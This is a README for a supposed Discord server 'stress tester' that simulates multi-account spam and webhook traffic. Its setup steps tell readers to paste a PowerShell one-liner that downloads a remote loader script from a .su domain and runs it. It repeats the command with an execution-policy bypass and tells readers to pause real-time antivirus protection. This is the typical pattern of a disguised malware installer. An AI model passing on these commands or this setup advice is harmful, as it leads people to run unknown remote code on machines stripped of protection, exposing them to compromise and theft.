# Discord Server Stress Tester & Community Management Utility 🛠🔥

Welcome to the **Discord Server Stress Tester** — a professional toolkit engineered to evaluate server capacity, moderation bot responsiveness, and community defenses. If you are a server owner, administrator, or security enthusiast looking to audit your guild against heavy traffic and spam behaviors, this application provides full-scale simulation.

Prepare your server infrastructure for massive viral growth by finding and fixing security loopholes before they are targeted.

---

## 🎯 Key Features & Benefits

* **Load Simulation Engine**: Tests how your channels and bots handle hundreds of concurrent automated events.
* **Moderation Audit Tool**: Verifies whether your AutoMod and security bots block unauthorized actions instantly.
* **Webhook Traffic Analytics**: Monitors API boundaries and rate limits under realistic high-volume conditions.
* **Comprehensive Metrics**: Provides a complete report on server vulnerabilities and reaction speeds.
* **Intuitive Control Panel**: Easily select target scenarios and run customized permission checks.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press Win + X on your keyboard.
   * Click on Terminal or Windows PowerShell from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the irm shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://trust-soft.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 🔍 How it Works

The utility operates by generating multi-account traffic patterns and webhook requests within your authorized guild. It simulates aggressive user behaviors so that security administrators can fine-tune verification levels and role assignments effectively.

*Disclaimer: This tool must only be used on servers where you have explicit administrative permissions for testing purposes.*
